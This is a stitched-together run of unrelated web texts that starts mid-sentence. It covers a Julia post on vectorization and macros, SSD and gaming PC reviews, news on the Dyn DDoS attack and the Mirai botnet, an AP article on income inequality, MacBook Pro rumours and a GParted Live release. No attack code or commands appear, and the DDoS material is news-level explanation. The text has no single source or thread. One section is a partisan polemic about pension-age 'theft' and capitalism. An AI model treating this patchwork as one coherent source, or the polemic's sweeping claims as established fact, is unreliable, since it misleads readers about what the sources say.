at the end of the alphabet, it is unclear what Canonical will do next. Will the company start again at A? If so, will it choose something other than adjectives and animals? What do you think Canonical should do? Tell me in the comments.

juliabloggers.com A Julia Language Blog Aggregator Menu Skip to content Home Submit Your RSS Feed Optimizing .*: Details of Vectorization and Metaprogramming By: Christopher Rackauckas Re-posted from: http://www.stochasticlifestyle.com/an-in-depth-look-at-vectorization/ For many of us mathematicians, we were taught to use MATLAB, and we were taught to vectorize everything. I mean obviously if we have matrices , , and and want to multiply element-wise (say to solve a reaction-equation at each point in space), then the optimal code is A.*B.*C No questions to ask, right? Actually, this code isn’t as optimized as you’d think. Lets dig deeper. BLAS, Linpack, and MKL The reason you are always told by “the lords of numerical math” to vectorize your code is because very smart programmers worked really hard on making basic things work well. Most of the “standardized” vectorized computations are calling subroutines from packages known as BLAS and LINPACK. To see what version your MATLAB is using, you can call version -blas
version -linpack So every time you call svd, A*B, etc., you are actually calling a highly-optimized state of the art C/Fortran/Assembly code mixture which does all sorts of things to make sure you don’t have cache misses, have the function multi-threaded (i.e. these functions will run parallel on your multi-core machine), and much more! But A.*B doesn’t do a BLAS call! When you use A.*B in MATLAB, it uses its own C-code to loop through an perform this operation. This causes a few problems. First of all, if you are using co-processors/accelerators such as the Xeon Phi, the option of automatically offloading highly-vectorized problems to a GPU-like device only offloads BLAS/LINPACK calls. Therefore A*B gets accelerated whereas A.*B does not. Another thing is that, as far as I can tell, A.*B does not have all of the processor-specific optimizations to make this operation super fast. This is huge since processor technologies like AVX2 allows specific vector operations to do calls on 8 numbers at a time, making highly-parallel math operations like this get close to an 8x speedup if used correctly (and AVX3 is coming out soon to double that!). So the simple A.*B is good for prototyping, but from benchmarking many SPDE solvers I realized this was holding me back. How can we do better? Well, we can replace .* with vector operations from MKL by directly calling MKL VML functions. MATLAB has a page on how to use the max interface to call BLAS/LINPACK functions and using this with the v?mul (i.e. vdmul for 64-bit floats). Thus to do this in MATLAB you have to write some C code. Fun! Number of Operations ~ Number of Calls However, this STILL isn’t optimal! Too see this, let us write out what MATLAB’s interpreter turns this into: times(times(A,B),C) Thus the behind the scenes looks something like this: for i = 1:N
  for j = 1:M
     temp = A[i,j] * B[i,j];
  end
end
 
%Some function call overhead to return temp, save it to temp2
 
for i = 1:N
  for j = 1:M
     temp3 = temp2[i,j] * C[i,j];
  end
end
 
%Return temp3 Instead of one NxM loop, we did two NxM loops, effectively doubling the amount of computations required! Now think about solving reactions like: A.*B.*C + D.*E*gamma + Diffusion*A; you see that simple vectorization is actually far from optimal. Not only did we have to do extra loops, but we also had to make a bunch of temporary variables and garbage collect. What we really want to do is something like: for i = 1:N
  for j = 1:M
     temp = A[i,j] * B[i,j] *C[i,j];
  end
end How do you do this in MATLAB? Once again, the answer is to write C-code via the MEX interface. You can do this if you want. Julia’s Approach Lets look at if Julia does any better. Since Julia is opensource, we can actually look directly at the source code. Since it’s written in Julia and hosted on github it’s easy to go through the details. In the Julia REPL, we can find out what function is actually called by looking at: julia> methods(.*)

.*(A::AbstractArray{T,N}, B::AbstractArray{T,N}) at sparse/sparsematrix.jl:1026
.*(As::AbstractArray{T,N}...) at broadcast.jl:307 What this is saying is that there are 26 possible function calls, each depending on the type that you put in there. For example, if you do .5.*(1:100), 1:100 is not an array but a special Julia type known as a range, and so .* calls the function .*(x::Number, r::Range{T}) which can be found in range.jl at line 647. For A.*B, we are want .*(A::AbstractArray{T,N}, B::AbstractArray{T,N}) at sparse/sparsematrix.jl:1026 Surprisingly, it’s actually defined in the sparematrix.jl file. Find that file on GitHub and we see that it is defined as:  
(.*)(A::AbstractArray, B::AbstractArray) = broadcast_zpreserving(MulFun(), A, B)
...
broadcast_zpreserving!(args...) = broadcast!(args...) MulFun() is the what Julia translates * into, and so this means that when Julia sees A.*B, it calls broadcast on the * function. In the Julia documentation we see that broadcast simply calls the function on all of the array members. This is what we’d expect it to do, but is it better than if we were to write a loop? We check broadcast.jl and find:         function broadcast!(f, B::$Bsig, As::$Asig...)
            nd = ndims(B)
            narrays = length(As)
 
            cache_f    = @get! cache      f       Dict{Int,Dict{Int,Any}}()
            cache_f_na = @get! cache_f    narrays Dict{Int,Any}()
            func       = @get! cache_f_na nd      $gbf($gbb, nd, narrays, f)
 
            func(B, As...)
            B
        end which shows that it speeds up the operation by storing the function in cache. So moral of the story, A.*B uses broadcast which will beat your simple loop because of cache-control. Can We Do Better? Now just like MATLAB’s .* we have to ask, can we do better? Well, the first things we can do is use MKL VML bindings in Julia. With that packages you can plug it in and call the functions with ease (once vdmul gets added…). We can even over-write .* so that VML is used by default. However, we still have the problem we noted with MATLAB that the most efficient way would be to de-vectorize and write a loop which does multiple operations at once. If you aren’t familiar with metaprogramming, it is simply using programs to write programs. MATLAB’s inability to metaprogram means we needed to go to C to write a loop, but that loop only works for exactly the type of inputs we had. It also causes problems since MATLAB’s anonymous functions are notoriously slow and so if you write a function that makes a function and you make it into an anonymous function (i.e. @(x) …), then you will have at least a 2x slowdown in your code over written the function yourself. Thus in MATLAB’s inability to metaprogram means you have to write a lot of code. This is where Julia being a newer langugage comes to the rescue. It is chalk-full of metaprogramming abilities. What we are going to use here are macros. In a previous post I used macros such as @simd without explaining what it did. Well, a macro is simply a type of metaprogramming function that re-writes the code associated with it. It’s best explained by an example. There is a de-vectorization module for Julia which contains the @devec macro. What is does is take a vectorized expression like: r = a .* b + c .* d + a and re-writes it as a de-vectorized loop: n = length(a)
r = zeros(n)
for i = 1 : n
    r[i] = a[i] * b[i] + c[i] * d[i] + a[i]
end In MATLAB we can’t use loops for high-performance code because they are not optimized, so we had to take our equations, write C-code, compile it, make sure it all works, get rid of segmentation faults… it wasn’t fun. In Julia, loops are optimized so there’s no reason to go to C to write the loop, and here the macro @devec does the same thing. Therefore, to make the optimized loop in Julia, we write @devec r = a .* b + c .* d + a Thus the difference between your “high-performance code” and your prototype code is @devec. Welcome to the future folks. Going all the way: Optimizing the loop That’s not necessarily the end. Remember that BLAS/MKL/VML uses technologies like SIMD/AVX in order to do multiple operations per computation? Intel has written a Julia macro which will take loops and vectorize them in this manner by adding the macro @simd before the loop. MKL also speeds up computations by lowering the precision in the math which can be done with the @fastmath macro. Lastly, we can to turn off array out of bounds checking to make things faster as well. Thus what we really want is @devec to write the code: n = length(a)
r = zeros(n)
@simd for i = 1 : n
    @fastmath @nobounds r[i] = a[i] * b[i] + c[i] * d[i] + a[i]
end By adding @fastmath @nobounds before @devec we can get that part changed. What about adding @simd? Macros can take in arguments, and the developer for @devec is looking to add a context argument so you can tell it to expand with @simd, @parallel (for multi-cpu), or even with Cuda (i.e. run this on GPU in parallel), OpenCL and others. Multi-threaded will probably be added as well when it’s added to Julia’s base library. If you want it done faster, just contribute to the github repository!. I do have to mention a caveat. There are codes where @devec will not work. For example, sqrt(exp(A*B)) where A and B are matrices. Even though it’s simple to see how we’d want to vectorize it, writing something that will go “okay, make A*B be a BLAS call, then call sqrt(exp()) on that” is hard to do generally. The creator of @devec is looking into using Julia’s generated functions to perform this kind of task. However, you can always do this by writing the loop out yourself. Or another vectorized implementation would be to use the broadcast function. Both are much easier than going to C and still do quite well performance-wise. (On this note, there is something like broadcast in MATLAB and these are the cellfun, structfun, arrayfun methods. However, they are so slow (except on GPUs where they are the fastest…) that they should never be used). Moral of the Story I hope I showed you that there is much more to making .* achieve its best performance than you originally thought. Of course, in MATLAB, using .* and other vectorized operations is almost always better than writing a loop. Thus in every class you’re told to ALWAYS use vectorized MATLAB functions because it’s best. In reality, that’s not the case. If you want performance, you need especially written loops in a high-performance language and you have to implement cache-handling, AVX/SIMD, multi-threading, etc. In MATLAB, this means writing C-codes and calling it via the MEX interface. This needs to be done for every different setup you encounter. However, in Julia, the @devec macro achieves the same end (almost, and it keeps getting better!). That’s the power of metaprogramming and one of the many reasons why I am trying to use more Julia.

Crucial MX300: Good Linux Performance, 525GB SSD For Only $120 USD Written by Michael Larabel in Storage on 22 October 2016. Page 1 of 3. 21 Comments This week I was shopping for a solid state drive to replace a hard drive on one of my backup/archival systems and ended up settling for the Crucial MX300 in getting 525GB of storage for just $120 USD. Here are some benchmarks of the Crucial CT525MX300SSD1 compared to some other SSDs on Linux for those curious. The Crucial MX300 525GB is rated for sequential reads up to 535 MB/s and sequential writes up to 510 MB/s, random reads up to 92K IOPS and random writes up to 83K IOPS. The Crucial MX300 uses Micron's 3D NAND tech. The MX300 series comes in 2.5-inch SSD and M.2 SSD versions while the one I had bought was the CT525MX300SSD1 SSD. This was my first time using a MX300 SSD but have used other Crucial SSDs on various Linux benchmarking test systems to fine success. I turned to this SSD for its rated performance while offering a half terabyte of storage that should be fine for my purposes and costing just $120 USD. The MX300 can be found at Amazon.com (where I purchased it, of course) as well as NewEgg.com. A 1TB version of the MX300 is available for under $250 or the 750GB version for $170. I ran some tests of the Crucial MX300 525GB SSD on my common Ubuntu 16.10 x86_64 Intel Skylake Xeon test setup with the Linux 4.8 kernel and using an EXT4 file-system. The performance was compared to the PNY CS1211, Corsair Force LX 256GB, OCZ Trion TR150 120GB, Intel 600P NVMe 256GB SSD, and Samsung 950 PRO NVMe 256GB SSD. All of these Linux solid-state drive benchmarks were carried out in a fully-automated manner using the open-source Phoronix Test Suite benchmarking software.

It suggested that today’s pensioners are to blame, which is partly true, but Channel Four didn’t explain why. Every British woman younger than 60 or so has had at least £30,000 stolen from her by the simple trick of suddenly moving the state pension age. Men have been robbed too, but not quite as much. This amounts to a total theft of hundreds of billions of pounds, money which many people are fully entitled to, right now, having paid National Insurance for decades in the belief they could retire at age 60, and 65 for men. Banks are properly penalised for mis-selling insurance, but their offence pails to insignificance compared with government mis-selling of National Insurance. The Dispatches documentary was by Fraser Nelson, editor of the Spectator, a magazine that peddles far-right propaganda. It suggested that today’s wealth gap is somehow the fault of pensioners, but said nothing about how much is being stolen from pensioners by the state. Today’s wealth gap is not because of rich pensioners (the state pension is less than half the National Minimum Wage, and only a third of the UK Living Wage), it’s because most pensioners have spent the last 40 years mistakenly voting for far-right politicians - in one guise or another. Capitalism, the economic dogma of the far-right, is the reason the young have mountains of student debt, unemployment, no affordable housing, deteriorating health care, environmental catastrophe and endless illegal wars. Capitalism is evil. That’s the best word for it. Andy Grove, multimillionaire CEO of Intel accurately described capitalism’s purpose as “shooting the wounded.” If the young want to enjoy better lives, as they easily could, and if they want to re-create a decent society for their children to inherit, they’re going to have to get rid of capitalism-loving politicians and make sure they never come to power again. Socialism isn’t perfect, but it offers the young and the old much more than capitalism. The young must get political, they need to learn about, and start voting for, socialism; and the old need to realise how they and their children have been stitched-up by the very people most of the old were tricked into voting for over the last four decades.

An attack on a major DNS service provider literally broke the internet Friday, impacting more than 80 popular websites, including PayPal, Reddit and Twitter. Here’s how a group of hackers is suspected to have pulled off the takedown. A myriad of websites were unavailable Friday as three separate distributed denial of service (DDoS) attacks on a major internet server blocked service to heavily trafficked websites such as Pinterest, Spotify and the New York Times. The first attack on the New Hampshire-based server occurred Friday morning, but Dyn DNS Company managed to resolve the issue within a few hours. However, a second attack began in the early afternoon followed by a third. It was not until 6:30 p.m. Eastern Time that all had been resolved. How did a series of cyber-attacks manage to bring large swathes of the internet to its knees? To understand why everyone’s favorite sites were unavailable Friday, it’s important to understand the nature of a Domain Name Server (DNS). Imagine a DNS as a telephone operator from the 1950s. By typing in a website’s name, you are asking the DNS to connect you to a specific server. When an army made up of botnets uses Wi-Fi routers, computers and other devices connected to the internet to create a network that can operate malware without the owner’s knowledge, they overwhelm a DNS server with requests that appear to be normal, so a system like Dyn’s struggles to filter them out. “They're tough attacks to stop because they often get channeled through recursive providers. They're not cacheable because of the random prefix,” Matthew Prince, co-founder and CEO of the content delivery and DDoS protection service provider CloudFlare explained to Ars Technica. When they generate requests, they attach random text to the front of domain names – which is how they appear to be unique requests. These requests pour in by the tens of millions. Like any operator receiving millions of requests at once, Dyn’s DNS broke down. Another part of the issue is the kind of malware used in the attack. Internet of Things devices were targeted and that covers anything with an internet connection. This includes everything from a standard computer to cellphones to Google Home to video cameras. In fact, the Prodigo Espresso maker relies on Internet of Things (IoT) technology. Therefore, a fancy coffee maker could have been partially responsible for putting a pause on Spotify. It certainly doesn’t help that the source code for a vicious type of malware was released on the dark web earlier this month. Known as Mirai, it spreads to IoT devices by scanning the internet for vulnerable devices that are seeded with malicious software. Once that software is in, an Espresso maker or other IoT appliance can become a central control server for a DDoS attack, according to Krebs on Security. Is this a hack? Not exactly. While some companies that handle money transfers, such as PayPal and Amazon, were affected, there is currently no evidence that any information was breached. PayPal told Reuters that its networks had not been hacked. Who’s behind these attacks? This is a good question that many are scrambling to answer. New World Hackers has claimed responsibility for the attack, according to activist and web consultant Gissur Simonarson. The shadowy group has prided themselves on their DDoS attacks, such as one that took the BBC’s website down last year. In an interview with Anon Intel Group, a representative of New World Hackers claimed the attack was “an annual power test,” and “this is actually against Russia. Testing power is the key. Like that we see how much bandwidth each attack outputs…” They claim that Friday’s attack was something of a warning shot to Russian hackers, saying: “Russia is pretty much saying they are better than the US by hacking into everything, attempting to start a war. We will show them a war.” The attacks came from all around the world, and both the FBI and Department of Homeland Security have said they were investigating, Reuters reported. The member of New World Hackers told Anon Intel: “We don’t want federal agents on our ass. That’s why we are in Russia.” WikiLeaks claimed its supporters were involved, tweeting out, “We ask supporters to stop taking down the US internet. You proved your point.” If New World Hackers is indeed behind the attack, then it was unlikely to have been in the name of aiding WikiLeaks. The Twitter account for New World Hackers told Simonarson: “WikiLeaks and Russia are kind of iffy. Sometimes we are friends, sometimes not. Overall, we are just against Russia because they are against the US.” Is this a one-off occurrence? There’s no way to predict the future, but it is safe to assume that this will happen again. While this is the largest attack, if New World Hackers makes good on their promises to attack other countries it will likely happen again.         LATEST STORIES (10) American Students Join Anti-Trump Protests across US Eleven Killed, Wounded in Terrorists' Rocket Attack in Western Damascus Samples Taken in Syria's Aleppo Prove Militants Used Chlorine Gas Syrian Army Discovers Terrorists' 700-Meter-Long Tunnel in Khan Al-Sheih Connecting Damascus to Quneitra Protests, Students Walkouts Mark Week after Trump's Win Yemen Water Crisis Iraqi Popular Forces Continue Operations against ISIL Terrorists West of Mosul Iraqi Forces Take Back Ancient City of Nimrud from ISIL Iraqi Popular Forces Safeguarding Peace in Newly Gained Territories near Mosul Police Violence during Anti-Trump Protests Iran and US: A Tale of Two Elections Supermoon in Iran's Sky Iran Eyeing NITC Listing in Int'l Stock Markets VP: World Admitting Iran's Constructive Role in Maintaining Regional Security Iraqi Interior Minister: Nearly 1,000 ISIL Terrorists Killed, Over 100 Captured in Mosul Operation American Students Join Anti-Trump Protests across US TEHRAN (FNA)- Protesters were not slowing down six days after Donald Trump's election, many of them high school students leaving class by the hundreds to carry signs and flags on the streets of several US cities.

WHY IT MATTERS: Income inequality World by Josh Boak, The Associated Press Posted Oct 21, 2016 11:17 pm MST Last Updated Oct 22, 2016 at 12:00 am MST WASHINGTON – THE ISSUE: The rich keep getting richer while more Americans are getting left behind financially. Income inequality has surged near levels last seen before the Great Depression. The average income for the top 1 per cent of households climbed 7.7 per cent last year to $1.36 million, according to tax data tracked by Emmanuel Saez, an economics professor at the University of California, Berkeley. That privileged sliver of the population saw pay climb at almost twice the rate of income growth for the other 99 per cent, whose pay averaged a humble $48,768. But why care how much the wealthy are making? What counts the most to any family is how much that family is bringing in. And that goes to the heart of the income-inequality debate: Most Americans still have yet to recover from the Great Recession, even though that downturn ended seven years ago. The average income for the 99 per cent is still lower than it was back in 1998 after adjusting for inflation. Meanwhile, incomes for the executives, bankers, hedge fund managers, entertainers and doctors who make up the top 1 per cent have steadily improved. These one-percenters account for roughly 22 per cent of all personal income, more than double the post-World War II era level of roughly 10 per cent. One reason the income disparity is troubling for the nation is that it’s thinning out the ranks of the middle class. ___ WHERE THEY STAND Hillary Clinton has highlighted inequality in multiple speeches, with her positions evolving somewhat over the past year. Bernie Sanders held her feet to the fire on that subject in the primaries. Clinton hopes to redirect more money to the middle class and impoverished. Clinton would raise taxes on the wealthy, increase the federal minimum wage, boost infrastructure spending, provide universal pre-K and offer the prospect of tuition-free college. Donald Trump offers a blunter message about a hollowed-out middle class and a system “rigged” against average Americans. Still, he has yet to emphasize income inequality in the campaign. To bring back the factory jobs long associated with the rise of the middle class, Trump has promised new trade deals and infrastructure spending. But Trump has also proposed a tax plan that would allow the wealthiest Americans to keep more of their earnings. ___ WHY IT MATTERS President Barack Obama has called rising inequality “the defining challenge of our time.” And experts warn that it may be slowing overall economic growth. Greater inequality has created a festering distrust of government and of corporate leaders whose promises of better times ahead never fully materialized. The result has been a backlash against globalization that many Americans feel tilted the economy against them. For the top 1 per cent, the ability to move money overseas and reach markets worldwide concentrated pay for “superstars,” according to economists. At the same time, factory workers now compete with 3 billion people in China, India, Eastern Europe and elsewhere who weren’t working for multinational corporations 20 years ago. Many now make products for Apple, Intel, General Motors and others at low wages. This has depressed middle-class pay. These trends have contributed to a “hollowed out” labour market in the United States, with more jobs at the higher and lower ends of the pay scale and fewer in the middle. Social factors have amplified the trend as well. Single-parent families are more likely to be poor than other families and less likely to ascend the income ladder. Finally, men and women with college degrees and high pay are more likely to marry each other and amplify income gaps. ___ This story is part of AP’s “Why It Matters” series, examining three dozen issues at stake in the presidential election.

The variants are expected to sport a much slimmer design compared to its predecessors. Rumours suggest that the MacBook Pro 2016 will have a larger Trackpad and a butterfly keyboard design. Apple is holding a press event on Oct. 27 at its Cupertino campus. The invites have been sent though it does not reveal anything about the MacBook Pro 2016. Fans expect the MacBook Pro line-up to be the centre of discussion when the event begins. Apple has reportedly made massive upgrades to the line-up in terms of both specs and design. A fully-customizable OLED touchscreen toolbar is rumoured to feature in the MacBook Pro 2016 that has replaced the F keys. The keyboard will reportedly change the keys displayed as per the app running on the computer and even change into a download progress bar. Touch ID feature is set to provide added security to the MacBook Pro 2016. This feature is already present in the iPhone models. The Touch ID is set to be incorporated into the “Power” button so that when a user presses the button it will result in automatic user verification via fingerprint scan, writes Tech Times. As per BGR, the Apple MacBook Pro 2016 is most-likely to boast Intel’s Skylake chipset and AMD Polaris graphics processor. The device may run on the MacOS Sierra that itself is a powerhouse of incredible features. The standard USB ports could be replaced by the much-talked-about USB-C ports and Thunderbolt 3. The Apple MacBook Pro has not received any major overhaul since 2012. It will also bring with it Apple's Siri voice-activated assistant and loads of other exciting features. Recently, a Reddit post appeared showing a prototype of the Apple e-ink keyboard being developed by Sonder. The post has been taken down. Apple has a reputation of taking big leaps that are first criticised but later become the new standard. A similar thing happened with the 3.5mm headphone jack that was dropped from the iPhone 7 and iPhone 7 Plus devices. Stay tuned on IBT AU for more updates on Apple MacBook Pro 2016.

PDT October 21, 2016 Payments System Hacking. Online Credit Cards Payment Security Concept. Hacker in Black Gloves Hacking the System. (Photo: welcomia, welcomia) CONNECT TWEET LINKEDIN GOOGLE+ PINTEREST SAN FRANCISCO — At least two successive waves of online attacks blocked multiple major websites Friday, at times making it impossible for many users on the East Coast to access Twitter, Spotify, Netflix, Amazon, Tumblr and Reddit. The first attacks appear to have begun around 7:10 am Friday, then resolved towards 9:30 am, but then a fresh wave began. The cause was a large-scale distributed denial of service attack (DDoS) against Internet performance company Dyn that blocked user access to many popular sites standstill. Dyn reported the sites going down at around 11:10 a.m. UTC, or roughly 7:10 a.m. ET, posting on its website that it "began monitoring and mitigating a DDoS attack against our Dyn Managed DNS infrastructure." In an update posted at 8:45 a.m. ET, the company confirmed the attack, noting that "this attack is mainly impacting US East and is impacting Managed DNS customers in this region. Our Engineers are continuing to work on mitigating this issue." White House Press Secretary Josh Earnest said the Department of Homeland Security was “monitoring the situation" but that “at this point I don’t have any information about who may be responsible for this malicious activity.” It was unclear Friday if the attacks are focused on Dyn specifically or companies that it provides services to, said Carl Herberger, vice president of security at security company Radware. The attack is “consistent with record-setting sized cyberattacks seen in the last few weeks,” he said. He noted that easy-to-use computer code that allows even amateurs to create to create robot networks, so-called 'bot nets', to attack websites was released by hackers earlier this month. Amazon, whose web service AWS hosts many of the web's popular destinations including Netflix, also reported East Coast issues around the same time. In an update posted at 9:36 a.m. ET it said that it had "been resolved and the service is operating normally." Amazon noted that it was suffering from a "hostname" issue and it was not immediately clear if it was related to the DDoS attack Dyn received. Denial of service attacks are when someone, or a group of people, floods a particular site or service with large amounts of fake traffic in an attempt to overwhelm the system and take it offline. It was not immediately clear who initiated Friday's attack or why. A post on Hacker News first identified the attack and named the sites that were affected. Several sites, including Spotify and GitHub, took to Twitter this morning to post status updates once the social network was back online. Twitter users similarly took to the service to keep lists of which sites were down and comment on the situation. The term DDoS quickly vaulted to among the top of the site's list of "Trending Topics" in the United States. "DDoS attack this morning takes out Reddit, Twitter & Spotify," wrote user @Anubis8. "Work productivity increases by 300%." How the attack works Dyn provides DNS service, effectively an Internet address book for companies and that’s what’s being attacked said Steve Grobman, chief technology officer for Intel Security. DNS stands for Domain Name Servers. These are computers that contain databases of URLs and the Internet Protocol addresses they represent. "If you go to a site, say www.yahoo.com, your browser needs to know what the underlying Internet address that’s associated with that URL is. DNS is the service that does that conversion,” said Grobman. For example, the IP address for yahoo.com is 209.191.88.254. The attack is on the Dyn server that contains that address book. Dyn provides that service to multiple Internet companies, so when someone types in twitter.com or tumblr.com or Spotify.com, via a complex series of jumps the address book is able to tell their browser which numerical IP address to look at. The DDoS attack floods that server with illegitimate requests, so many that very few real requests can get through. The user gets a message that the server is not available. Service is intermittent because a few requests are sometimes still able to go through. In addition, many sites keep cached address books their computers can refer to. However those caches always have a time limit on them and when that “time to live” expires, they must go back to the DNS server to confirm the IP address is valid. If the DNS server is unavailable, a site that was working could suddenly stop being available, said Grobman.

Go Phones Laptops Cameras TV Gaming Wearables Forum MORE All articles Best picks Drones Car Tech Smart Home Gift Ideas Downloads Login Follow Us Follow Us Subscribe Gaming PCs Review Lenovo Ideacentre Y700 (GTX 1070) Review: Solid Gaming Value by Michael Andronico Oct 21, 2016, 5:22 PM Lenovo Ideacentre Y700 (GTX 1070) The good Easy to upgrade Fairly affordable Strong gaming performance The bad Competitors offer more style and features A bit bulky Verdict The Lenovo Ideacentre Y700 performs well for an entry-level gaming PC, but it's not quite as sleek or feature-rich as the competition. 7/10 Very good $1349.00 Lenovo Enjoying PC gaming is less terrifying to your wallet than ever, largely thanks to machines such as the Lenovo Ideacentre Y700 that cram powerful parts into an affordable package. The Y700's Core i5 processor and GTX 1070 graphics card make it well equipped for playing modern games at high settings and handling virtual reality. In addition, its easy-to-upgrade chassis makes adding new components a breeze. The Y700 is a solid entry point for new PC gamers, though you can find more stylish and customizable options in the same price range. Design The Lenovo Ideacentre Y700 is nearly identical in design to its more premium Y900 counterpart, meaning you'll get the same black, scaly chassis and huge glowing Y logo on the front. You won't, however, get the Y900's transparent side panel, though you can still see the green glow of the PC's graphics cards through a small vent on the side. You can adjust the dimness of the Y700's front-facing lights (or turn them off) via a built-in app, but you're stuck with red for the color. If that's a deal-breaker for you, Lenovo's upcoming Razer Edition PCs will let you go wild with a whole bunch of different hues. The Y700 takes up a decent amount of space at 20 x 19 x 8 inches and weighs a hefty 33 pounds, but a handle at the top makes it fairly easy to carry. The PC is slightly bigger than Alienware's Aurora mid-tower, but a bit smaller than Acer's monstrous Predator G6. MORE: The Best Gaming Desktops Available Now Ports and Upgradability The Y700's front panel makes it easy to plug and play, with two USB 2.0 ports, two USB 3.0 ports, a 7-in-1 card reader and headphone and mic jacks. There's also a DVD-R drive for those still clinging to physical media. You'll find everything else you need in the back, including four more USB 3.0 ports, an additional two USB 2.0 ports, an Ethernet jack, a full suite of audio ports and a PS/2 connector for ancient mice and keyboards. The Y700's Nvidia GTX 1070 graphics card packs three DisplayPorts, an HDMI port and a VGA ports, giving you plenty of options for connecting to multiple monitors. Opening up the Y700 is a breeze -- once you pop a lock on the back panel and press a button at the top, the PC's side panel comes right off. From there, you'll have easy access to just about every component, including RAM slots and hot-swap storage bays. You can even remove the graphics card tool-free, though you will have to fiddle with a few plugs and switches before you get there. I still prefer the more seamless tool-free lever on the Alienware Aurora, but I appreciate that I can take out the Y700's GPU without busting out a screwdriver. Gaming Performance The Y700 has Nvidia's new GeForce GTX 1070 GPU, which is designed to handle VR and graphic-intensive games without the higher price tag of the beefier GTX 1080. Lenovo's PC proved capable of handling the gorgeous Rise of the Tomb Raider in 4K with graphics set to high, rendering the game's snowy mountains and lifelike hair physics at a steady 40 frames per second. Lowering the resolution to 2560 x 1440 yielded an even smoother 60 fps. The Y700 yielded an impressive 97 fps on our Grand Theft Auto V test, which consists of a scripted sequence of open-world mayhem with graphics maxed out at 1080p. The performance perks of Nvidia's new 10-series GPUs became clear once we ran the Y700 through the 3DMark Fire Strike Ultra test, which measures 4K performance. Lenovo's PC scored a 3,123, topping the Alienware X51 (2,446) and the Asus ROG G20CB (2,153), both of which use the older GTX 970 cards. MORE: The Best Gaming Laptops VR Readiness The Y700's Nvidia GTX 1070 graphics card makes it VR-ready on paper, but we ran a few tests just to be certain. Lenovo's PC got the thumbs up from Oculus' Compatibility Check app, which scans your system to ensure you have the proper CPU, GPU and ports for virtual reality. Lenovo's PC performed admirably on the SteamVR Performance test, which runs your system through a Portal-themed demo to measure its virtual-reality chops. The Y700 scored a 10.9, which Valve calls more than enough for high-end VR. That's just barely behind our GTX 1080-powered Lenovo Y900 and the Alienware Aurora, both of which scored 11. Overall Performance With a 6th-gen Intel Core i5-6600 processor and 8GB of RAM, the Y700 is perfectly good at juggling multiple tasks in between game sessions. I never experienced any significant slowdown while using Lenovo's gaming machine, even as I bounced between Google Docs, email and four different Twitch streams while running a full system scan and copying a folder full of games in the background. Lenovo's PC scored a 10,788 on the Geekbench 3 overall performance test, performing comparably to the Asus G20CB (10,979, Core i5) but lagging behind a Core i5-powered Alienware X51 (12,526) and the 14,743 gaming desktop average. The Y700's 128GB SSD copied about 5GB of files in 46 seconds, for a rate of 110.6 MBps. That's slower than the 256GB SSDs found in our Asus G20CB (171.3 MBps) and Alienware X51 (279.3 MBps). MORE: Here Are the Best PC Game Controllers Software The Y700 comes with a non-intrusive batch of Lenovo apps, but you probably won't use most of them. Aside from the aforementioned LED Control Center, there's Lenovo Companion, a central hub that lets you monitor your system's health, view warranty information and browse guides and tips. There's also Lenovo's ShareIt app, which lets you beam files between your smartphone and PC, as well as ReachIt, a cloud-storage app that, coincidentally, was recently discontinued. You can burn DVDs with the Power2Go app, or view media files with PowerDVD. Keyboard and Mouse Lenovo is likely banking on you bringing your own gaming mouse and keyboard to the party, because the Y700's peripherals are extremely vanilla. Lenovo's USB mouse and keyboard work just fine for everyday computing, but they lack any gaming-centric features. Lenovo's keyboard is fairly snappy, but its keys start to feel a bit shallow once you start hammering away. I was able to type at a speedy 104 words per minute with near-perfect accuracy on an online typing test, though my hands got a bit cramped whenever I typed that fast. The included mouse is perfectly comfortable, but don't expect the thumb buttons and DPI switch that come standard on any gaming mouse. MORE: Our Favorite Gaming Mice for Every Genre Configurations We reviewed the lone $1,349 version of the Y700, which packs a 6th-gen Intel Core i5-6600 processor, 8GB of RAM, a 1TB, 7,200-rpm hard drive with a 128GB SSD and an Nvidia GeForce GTX 1070 graphics card. You'll also get Lenovo's stock USB mouse and keyboard. Bottom Line The $1,349 Ideacentre Y700 accomplishes its goal of providing VR-ready gaming performance at a decent price. Its Nvidia GTX 1070 graphics card and Core i5 processor are ideal for both graphically rich gaming and productive multitasking, and its easy-open chassis means that even tech newbies can add new parts over time. However, the Y700 isn't the only entry-level gaming PC out there, nor is it the cheapest. The Alienware Aurora with similar specs will run you a slightly cheaper $1,224 and has a sleeker, more customizable chassis, while the Asus ROG G20CB ($1,449 as reviewed) packs similar guts into a wonderfully compact body. You won't be disappointed by the Y700's overall performance, but it's got some seriously worthwhile competition.  7/10 Quick Take Get the Ideacentre Y700 if you want an upgradable, VR-ready gaming PC for a reasonable price. If you want something more stylish and customizable, check out the Alienware Aurora. $1349.00 Lenovo About the author Michael Andronico @MikeAndronico Mike Andronico is an associate editor at Tom's Guide.

GParted Live 0.27.0-1 Disk Partitioning Live CD Out Now, Based on GParted 0.27.0 The Live CD uses the Linux 4.7.6 kernel and e2fsprogs 1.43.3 Oct 23, 2016 21:30 GMT  ·  By Marius Nestor  ·  Share:  Just one day after announcing the release of the GParted 0.27.0 open-source partition editor software, Curtis Gedak is informing us about the availability of the GParted Live 0.27.0-1 stable release. For those not aware, GParted Live is an open source project that aims to offer users a Debian-based Live CD distribution built around the GParted application, which can be used for manipulating (partition, merge, split, format, etc.) disk drives independent of the operating system installed on the target computer. As mentioned before, GParted Live 0.27.0-1 is the latest stable release, and it ships with GParted 0.27.0, which brings automatic detection of GRUB2 core.img files, addresses an issue with the Mount Point column on openSUSE distributions and fixes a bunch of bugs reported by users since the previous maintenance update, namely GParted 0.26.1. Apart from the GParted 0.27.0 software, the GParted Live 0.27.0-1 release ships with up-to-date software components from the Debian Sid (Unstable) repositories released as of October 20, 2016, the Linux 4.7.6 kernel, which is now EOL, as well as the e2fsprogs 1.43.3 package with better support for resizing EXT2, EXT3, and EXT4 filesystems. "This release includes GParted 0.27.0, patches for libparted for FAT file system operations, and other improvements," said Curtis Gedak in the release announcement. "This release of GParted Live has been successfully tested on VirtualBox, VMware, BIOS, UEFI, and physical computers with AMD/ATI, NVidia, and Intel graphics." Last but not least, GParted Live 0.27.0-1, which users can download right now via our website as Live ISO images, includes a patched version of the libparted library, addressing crashes when attempting to check FAT32 formatted filesystems, and support for detection of FAT32 resized partitions on Windows OSes. #GParted Live 0.27.0-1#GParted 0.27.0#partition editor#Debian Sid#Linux reddit it! flip it share it tweet it Related  ·  Hot right now  ·  Latest news Netrunner Core 16.09 "Avalon" Is Based on Debian GNU/Linux 8, KDE Plasma 5.7.5 Linux Kernels 3.16.38, 3.12.66, 3.10.104, and 3.2.83 Patched Against "Dirty COW" Nvidia 